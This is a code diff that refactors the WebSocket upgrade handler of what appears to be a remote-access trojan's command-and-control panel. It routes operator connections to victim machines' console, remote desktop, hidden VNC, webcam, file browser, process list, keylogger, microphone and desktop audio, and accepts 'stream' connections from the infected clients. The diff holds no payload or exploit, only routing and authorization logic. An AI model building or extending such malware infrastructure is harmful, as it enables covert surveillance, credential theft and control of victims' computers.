@@ -1,8 +1,9 @@
 import { authenticateRequest } from "../../auth";
 import { logger } from "../../logger";
 import { isIpBanned } from "../../db";
-import type { FeatureName } from "../../users";
+import type { FeatureName, UserRole } from "../../users";
 import { hasPermission, requireClientAccess, requireFeatureAccess } from "../../rbac";
+import type { SocketRole } from "../../sessions/types";
 
 type RequestServer = {
   requestIP: (req: Request) => { address?: string } | null | undefined;
@@ -57,36 +58,179 @@ function checkOperatorAccess(
   return null;
 }
 
+type AuthenticatedUser = {
+  userId: number;
+  role: UserRole;
+};
+
+type ClientViewerUpgradeRoute = {
+  pattern: RegExp;
+  role: SocketRole;
+  feature: FeatureName;
+  sessionId?: () => string;
+};
+
+const clientViewerUpgradeRoutes: ClientViewerUpgradeRoute[] = [
+  {
+    pattern: /^\/api\/clients\/(.+)\/console\/ws$/,
+    role: "console_viewer",
+    feature: "console",
+    sessionId: () => crypto.randomUUID(),
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/rd\/ws$/,
+    role: "rd_viewer",
+    feature: "remote_desktop",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/hvnc\/ws$/,
+    role: "hvnc_viewer",
+    feature: "hvnc",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/webcam\/ws$/,
+    role: "webcam_viewer",
+    feature: "webcam",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/files\/ws$/,
+    role: "file_browser_viewer",
+    feature: "file_browser",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/processes\/ws$/,
+    role: "process_viewer",
+    feature: "processes",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/keylogger\/ws$/,
+    role: "keylogger_viewer",
+    feature: "keylogger",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/voice\/ws$/,
+    role: "voice_viewer",
+    feature: "voice",
+  },
+  {
+    pattern: /^\/api\/clients\/(.+)\/desktop-audio\/ws$/,
+    role: "desktop_audio_viewer",
+    feature: "voice",
+  },
+];
+
+type GlobalViewerUpgradeRoute = {
+  path: string;
+  role: SocketRole;
+  authorize?: (user: AuthenticatedUser) => Response | null;
+};
+
+const globalViewerUpgradeRoutes: GlobalViewerUpgradeRoute[] = [
+  { path: "/api/notifications/ws", role: "notifications_viewer" },
+  { path: "/api/dashboard/ws", role: "dashboard_viewer" },
+  {
+    path: "/api/chat/ws",
+    role: "chat_viewer",
+    authorize: (user) =>
+      hasPermission(user.role, "chat:write", user.userId)
+        ? null
+        : new Response("Forbidden: Chat access denied", { status: 403 }),
+  },
+];
+
+function getRequestIp(req: Request, server: RequestServer): string {
+  return server.requestIP(req)?.address || "";
+}
+
+function upgradeOrFail(
+  req: Request,
+  server: RequestServer,
+  data: Record<string, unknown>,
+): Response {
+  if (server.upgrade(req, { data })) {
+    return new Response();
+  }
+  return new Response("Upgrade failed", { status: 500 });
+}
+
+async function authenticateViewerRequest(req: Request): Promise<AuthenticatedUser | Response> {
+  const user = await authenticateRequest(req);
+  if (!user) {
+    return new Response("Unauthorized", { status: 401 });
+  }
+  return user;
+}
+
+async function tryClientViewerUpgrade(
+  req: Request,
+  url: URL,
+  server: RequestServer,
+): Promise<Response | null> {
+  for (const route of clientViewerUpgradeRoutes) {
+    const match = url.pathname.match(route.pattern);
+    if (!match) continue;
+
+    const user = await authenticateViewerRequest(req);
+    if (user instanceof Response) return user;
+
+    if (user.role === "viewer") {
+      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
+    }
+
+    const clientId = match[1];
+    const denied = checkOperatorAccess(user, clientId, route.feature);
+    if (denied) return denied;
+
+    const data: Record<string, unknown> = {
+      role: route.role,
+      clientId,
+      ip: getRequestIp(req, server),
+      userRole: user.role,
+      userId: user.userId,
+    };
+    if (route.sessionId) {
+      data.sessionId = route.sessionId();
+    }
+    return upgradeOrFail(req, server, data);
+  }
+
+  return null;
+}
+
+async function tryGlobalViewerUpgrade(
+  req: Request,
+  url: URL,
+  server: RequestServer,
+): Promise<Response | null> {
+  if (req.method !== "GET") return null;
+
+  const route = globalViewerUpgradeRoutes.find((candidate) => candidate.path === url.pathname);
+  if (!route) return null;
+
+  const user = await authenticateViewerRequest(req);
+  if (user instanceof Response) return user;
+
+  const denied = route.authorize?.(user);
+  if (denied) return denied;
+
+  return upgradeOrFail(req, server, {
+    role: route.role,
+    clientId: "",
+    ip: getRequestIp(req, server),
+    userRole: user.role,
+    userId: user.userId,
+  });
+}
+
 export async function handleWsUpgradeRoutes(
   req: Request,
   url: URL,
   server: RequestServer,
   deps: WsUpgradeDeps,
 ): Promise<Response | null> {
-  const ip = server.requestIP(req)?.address || "";
+  const ip = getRequestIp(req, server);
   if (isWsRateLimited(ip)) {
     return new Response("Too Many Requests", { status: 429 });
-  }
-
-  const consoleWsMatch = url.pathname.match(/^\/api\/clients\/(.+)\/console\/ws$/);
-  if (consoleWsMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = consoleWsMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "console");
-    if (denied) return denied;
-    const sessionId = crypto.randomUUID();
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "console_viewer", clientId, sessionId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
   }
 
   const wsMatch = url.pathname.match(/^\/api\/clients\/(.+)\/stream\/ws$/);
@@ -97,215 +241,18 @@ export async function handleWsUpgradeRoutes(
     }
     const clientId = wsMatch[1];
     const role = "client";
-    const ip = server.requestIP(req)?.address || "";
     if (ip && isIpBanned(ip)) {
       logger.warn(`[auth] Rejected banned IP ${ip} for client ${clientId}`);
       return new Response("Forbidden", { status: 403 });
     }
-    if (server.upgrade(req, { data: { role, clientId, ip } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
+    return upgradeOrFail(req, server, { role, clientId, ip });
   }
 
-  const rdMatch = url.pathname.match(/^\/api\/clients\/(.+)\/rd\/ws$/);
-  if (rdMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
+  const clientViewerResponse = await tryClientViewerUpgrade(req, url, server);
+  if (clientViewerResponse) return clientViewerResponse;
 
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = rdMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "remote_desktop");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "rd_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const hvncMatch = url.pathname.match(/^\/api\/clients\/(.+)\/hvnc\/ws$/);
-  if (hvncMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = hvncMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "hvnc");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "hvnc_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const webcamMatch = url.pathname.match(/^\/api\/clients\/(.+)\/webcam\/ws$/);
-  if (webcamMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = webcamMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "webcam");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "webcam_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const fbMatch = url.pathname.match(/^\/api\/clients\/(.+)\/files\/ws$/);
-  if (fbMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = fbMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "file_browser");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "file_browser_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const processMatch = url.pathname.match(/^\/api\/clients\/(.+)\/processes\/ws$/);
-  if (processMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = processMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "processes");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "process_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const keyloggerMatch = url.pathname.match(/^\/api\/clients\/(.+)\/keylogger\/ws$/);
-  if (keyloggerMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = keyloggerMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "keylogger");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "keylogger_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const voiceMatch = url.pathname.match(/^\/api\/clients\/(.+)\/voice\/ws$/);
-  if (voiceMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = voiceMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "voice");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "voice_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  const desktopAudioMatch = url.pathname.match(/^\/api\/clients\/(.+)\/desktop-audio\/ws$/);
-  if (desktopAudioMatch) {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-
-    if (user.role === "viewer") {
-      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
-    }
-    const clientId = desktopAudioMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "voice");
-    if (denied) return denied;
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "desktop_audio_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  if (req.method === "GET" && url.pathname === "/api/notifications/ws") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "notifications_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  if (req.method === "GET" && url.pathname === "/api/dashboard/ws") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "dashboard_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
-
-  if (req.method === "GET" && url.pathname === "/api/chat/ws") {
-    const user = await authenticateRequest(req);
-    if (!user) {
-      return new Response("Unauthorized", { status: 401 });
-    }
-    if (!hasPermission(user.role, "chat:write", user.userId)) {
-      return new Response("Forbidden: Chat access denied", { status: 403 });
-    }
-    const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "chat_viewer", clientId: "", ip, userRole: user.role, userId: user.userId } })) {
-      return new Response();
-    }
-    return new Response("Upgrade failed", { status: 500 });
-  }
+  const globalViewerResponse = await tryGlobalViewerUpgrade(req, url, server);
+  if (globalViewerResponse) return globalViewerResponse;
 
   return null;
 }
